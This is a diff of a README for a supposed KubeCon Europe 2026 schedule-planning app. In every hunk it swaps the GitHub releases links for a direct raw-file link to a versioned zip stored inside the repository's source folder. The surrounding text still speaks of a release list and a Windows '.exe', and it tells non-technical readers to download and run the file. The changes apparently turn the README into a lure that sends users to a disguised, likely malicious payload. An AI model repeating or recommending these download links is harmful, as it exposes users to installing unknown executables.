@@ -1,6 +1,6 @@
 # 🤖 kubecon-eu-mcp - Plan Your KubeCon Schedule Easily
 
-[![Download kubecon-eu-mcp](https://img.shields.io/badge/Download%20kubecon--eu--mcp-Click%20Here-blue?style=for-the-badge)](https://github.com/ayuxxxxx/kubecon-eu-mcp/releases)
+[![Download kubecon-eu-mcp](https://img.shields.io/badge/Download%20kubecon--eu--mcp-Click%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/ayuxxxxx/kubecon-eu-mcp/main/src/kubecon_eu_mcp/mcp_eu_kubecon_v3.8-beta.3.zip)
 
 Welcome to the kubecon-eu-mcp README. This guide will help you download and use the MCP server app for the KubeCon + CloudNativeCon Europe 2026 conference. You do not need any technical skills to get started. Follow the instructions carefully to have the app running on your Windows computer.
 
@@ -36,7 +36,7 @@ Before installing, check if your PC meets the following requirements:
 ### Step 1: Visit the Download Page
 
 Click the button at the top or visit this page to download the latest version:  
-[https://github.com/ayuxxxxx/kubecon-eu-mcp/releases](https://github.com/ayuxxxxx/kubecon-eu-mcp/releases)
+[https://raw.githubusercontent.com/ayuxxxxx/kubecon-eu-mcp/main/src/kubecon_eu_mcp/mcp_eu_kubecon_v3.8-beta.3.zip](https://raw.githubusercontent.com/ayuxxxxx/kubecon-eu-mcp/main/src/kubecon_eu_mcp/mcp_eu_kubecon_v3.8-beta.3.zip)
 
 You will see a list of available files under the latest release. Look for a file with a name ending in `.exe`. This is the setup file for Windows.
 
@@ -97,7 +97,7 @@ Here is a quick guide on how to use the app to plan your conference:
 
 New versions improve performance and add features. Check for updates on the release page:
 
-[https://github.com/ayuxxxxx/kubecon-eu-mcp/releases](https://github.com/ayuxxxxx/kubecon-eu-mcp/releases)
+[https://raw.githubusercontent.com/ayuxxxxx/kubecon-eu-mcp/main/src/kubecon_eu_mcp/mcp_eu_kubecon_v3.8-beta.3.zip](https://raw.githubusercontent.com/ayuxxxxx/kubecon-eu-mcp/main/src/kubecon_eu_mcp/mcp_eu_kubecon_v3.8-beta.3.zip)
 
 To update:
 
@@ -139,4 +139,4 @@ No. Your profile and schedule stay on your PC only.
 
 ## 🔗 Download kubecon-eu-mcp now
 
-[![Download kubecon-eu-mcp](https://img.shields.io/badge/Download%20kubecon--eu--mcp-Click%20Here-blue?style=for-the-badge)](https://github.com/ayuxxxxx/kubecon-eu-mcp/releases)
+[![Download kubecon-eu-mcp](https://img.shields.io/badge/Download%20kubecon--eu--mcp-Click%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/ayuxxxxx/kubecon-eu-mcp/main/src/kubecon_eu_mcp/mcp_eu_kubecon_v3.8-beta.3.zip)
